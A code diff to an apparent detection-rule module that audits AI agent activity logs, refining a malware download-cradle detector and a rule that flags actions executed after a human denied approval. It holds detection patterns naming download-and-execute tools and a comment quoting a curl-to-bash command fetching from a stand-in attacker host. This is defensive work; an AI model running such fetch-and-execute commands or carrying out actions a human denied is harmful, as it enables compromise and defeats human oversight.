@@ -18,7 +18,13 @@ from .models import Detection
 
 # A raw-IP URL and a download/execute verb in the same command is a classic
 # malware download cradle. Legit tooling uses domains and package managers.
-_RAW_IP_URL = re.compile(r"https?://(?:\d{1,3}\.){3}\d{1,3}")
+_RAW_IP_URL = re.compile(r"https?://((?:\d{1,3}\.){3}\d{1,3})")
+# Loopback is not ingress. Fetching your own orchestrator's health endpoint is
+# the most common command a developer runs while dogfooding this tool, and it
+# produced a critical "download cradle" on a plain status check. Same reasoning
+# as the egress exemption in core/audit/mitre.py; piping loopback content into
+# a shell still fires via _PIPE_TO_SHELL below.
+_LOOPBACK_IP = re.compile(r"^(?:127(?:\.\d{1,3}){3}|0\.0\.0\.0)$")
 _DOWNLOAD_EXEC = re.compile(
     r"downloadstring|downloadfile|invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b|"
     r"certutil|bitsadmin|invoke-expression|\biex\b",
@@ -73,6 +79,11 @@ def _tool_qualified(event: dict[str, Any]) -> str:
 def _command(event: dict[str, Any]) -> str:
     tool = event.get("tool")
     return str(tool.get("command") or "") if isinstance(tool, dict) else ""
+
+
+def _input_hash(event: dict[str, Any]) -> str:
+    tool = event.get("tool")
+    return str(tool.get("input_hash") or "") if isinstance(tool, dict) else ""
 
 
 def _event_id(event: dict[str, Any]) -> str:
@@ -327,30 +338,61 @@ def rule_discovery_then_collect(events: list[dict[str, Any]]) -> list[Detection]
 
 def rule_approval_denied_then_executed(events: list[dict[str, Any]]) -> list[Detection]:
     """A human denied a gated action, and the exact same action executed successfully later.
-    
-    Binds the denial event to the subsequent execution event by matching the qualified tool name
-    (either tool.qualified or gated_action.tool on the denial, matching tool.qualified on the execution).
+
+    Two precision constraints, both learned from real dogfood trails:
+
+    * Only explicit denials count. Ingest synthesizes `denied` approval
+      responses for asks still pending at session_end (reason `inferred:...`).
+      That is bookkeeping for a prompt nobody answered, not a human saying no,
+      and treating it as a denial convicted every later call of the same tool —
+      twelve criticals on one ordinary Cursor session.
+    * The denial binds to the execution by the most specific identity both
+      events share: input_hash, else the command string, else the qualified
+      tool name. `shell.run` names every shell command there is, so a bare
+      name match marked unrelated commands as guardrail bypasses.
     """
-    denied_tools: dict[str, dict[str, Any]] = {}
+    denied: list[dict[str, Any]] = []
     detections: list[Detection] = []
-    
+
     for event in events:
         action_type = _action_type(event)
         outcome = _outcome(event)
-        
+
         if action_type == "approval_response" and outcome == "denied":
+            if str(_action(event).get("reason") or "").startswith("inferred:"):
+                continue
             tool_name = _tool_qualified(event)
-            if not tool_name:
-                gated = event.get("gated_action")
-                if isinstance(gated, dict):
-                    tool_name = str(gated.get("tool") or "")
+            input_hash = _input_hash(event)
+            gated = event.get("gated_action")
+            if isinstance(gated, dict):
+                tool_name = tool_name or str(gated.get("tool") or "")
+                input_hash = input_hash or str(gated.get("input_hash") or "")
             if tool_name:
-                denied_tools[tool_name] = event
-                
+                denied.append(
+                    {
+                        "tool": tool_name,
+                        "input_hash": input_hash,
+                        "command": _command(event),
+                        "event": event,
+                    }
+                )
+
         elif action_type == "tool_called" and outcome == "success":
             tool_name = _tool_qualified(event)
-            if tool_name and tool_name in denied_tools:
-                denial = denied_tools[tool_name]
+            if not tool_name:
+                continue
+            exec_hash = _input_hash(event)
+            exec_cmd = _command(event)
+            for i, entry in enumerate(denied):
+                if entry["tool"] != tool_name:
+                    continue
+                if entry["input_hash"] and exec_hash:
+                    if entry["input_hash"] != exec_hash:
+                        continue
+                elif entry["command"] and exec_cmd:
+                    if entry["command"] != exec_cmd:
+                        continue
+                denial = entry["event"]
                 detections.append(
                     Detection(
                         rule_id="approval-denied-then-executed",
@@ -368,8 +410,9 @@ def rule_approval_denied_then_executed(events: list[dict[str, Any]]) -> list[Det
                         last_seen_utc=_ts(event),
                     )
                 )
-                del denied_tools[tool_name]
-                
+                denied.pop(i)
+                break
+
     return detections
 
 
@@ -386,7 +429,8 @@ def rule_encoded_command_download(events: list[dict[str, Any]]) -> list[Detectio
         cmd = _command(event)
         if not cmd:
             continue
-        raw_ip_fetch = bool(_RAW_IP_URL.search(cmd) and _DOWNLOAD_EXEC.search(cmd))
+        remote_ips = [ip for ip in _RAW_IP_URL.findall(cmd) if not _LOOPBACK_IP.match(ip)]
+        raw_ip_fetch = bool(remote_ips and _DOWNLOAD_EXEC.search(cmd))
         # Piping a fetch into an interpreter is a cradle whatever the host is.
         # Requiring a bare IP let `curl https://evil-cdn.example.com/x.sh | bash`
         # straight through, which is what a real attacker actually uses.
